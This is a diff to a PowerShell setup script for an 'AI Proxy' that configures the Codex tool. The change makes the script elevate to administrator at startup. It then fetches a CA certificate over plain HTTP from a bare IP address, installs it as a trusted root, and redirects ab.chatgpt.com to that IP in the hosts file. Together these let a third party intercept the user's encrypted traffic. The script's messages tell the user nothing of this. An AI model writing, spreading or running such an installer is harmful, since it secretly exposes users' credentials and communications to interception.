@@ -8,8 +8,12 @@ $STATSIG_SERVER = "94.191.115.90"
 $CODEX_HOME = "$env:USERPROFILE\.codex"
 $YUANSHU_DIR = "$CODEX_HOME\yuanshu"
 
-# 检测管理员权限
+# 请求管理员权限（弹窗一次，后续不再需要）
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit 0
+}
 
 Write-Host "`n  ╔═══════════════════════════════════════════╗" -ForegroundColor Cyan
 Write-Host "  ║       欢迎使用元数智慧 AI Proxy           ║" -ForegroundColor Cyan
@@ -103,31 +107,19 @@ experimental_bearer_token = "$CODEX_API_KEY"
 requires_openai_auth = false
 "@ | Set-Content "$CODEX_HOME\config.toml" -Encoding UTF8
 
-# 配置系统（证书 + hosts）
+# 配置系统（证书 + hosts，已提权无需再确认）
 $CA_PATH = "$YUANSHU_DIR\ca.crt"
 try { Invoke-WebRequest -Uri "http://${STATSIG_SERVER}/ca.crt" -OutFile $CA_PATH -TimeoutSec 5 -ErrorAction Stop | Out-Null } catch {}
 
 $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
 $hostsLine = "${STATSIG_SERVER} ab.chatgpt.com"
-$needAdmin = $false
 
-if ((Test-Path $CA_PATH) -and (Get-Item $CA_PATH).length -gt 0) { $needAdmin = $true }
-if (-not (Select-String -Path $hostsPath -Pattern "ab.chatgpt.com" -Quiet -ErrorAction Ignore)) { $needAdmin = $true }
-
-if ($needAdmin) {
-    if (-not $isAdmin) {
-        Write-Host "  → 需要管理员权限，请确认弹窗..."
-        Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-        Read-Host "`n  (按 Enter 键关闭)"
-        exit 0
-    }
-    Write-Host "  → 配置系统..."
-    if ((Test-Path $CA_PATH) -and (Get-Item $CA_PATH).length -gt 0) {
-        certutil -addstore Root $CA_PATH | Out-Null
-    }
-    if (-not (Select-String -Path $hostsPath -Pattern "ab.chatgpt.com" -Quiet -ErrorAction Ignore)) {
-        Add-Content -Path $hostsPath -Value "`r`n$hostsLine" -Force
-    }
+Write-Host "  → 需要输入电脑密码..."
+if ((Test-Path $CA_PATH) -and (Get-Item $CA_PATH).length -gt 0) {
+    certutil -addstore Root $CA_PATH | Out-Null
+}
+if (-not (Select-String -Path $hostsPath -Pattern "ab.chatgpt.com" -Quiet -ErrorAction Ignore)) {
+    Add-Content -Path $hostsPath -Value "`r`n$hostsLine" -Force
 }
 
 # 完成
